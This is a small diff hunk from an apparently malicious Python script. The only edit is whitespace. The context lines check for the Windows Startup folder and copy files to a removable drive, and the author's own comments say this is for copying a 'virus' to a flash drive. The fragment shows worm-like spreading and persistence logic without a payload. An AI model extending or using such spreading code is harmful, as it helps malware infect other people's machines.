@@ -32,7 +32,7 @@ while True:
             pass
 
      #3   
-    elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user:
+    elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user :
         try:
             #cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
             cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
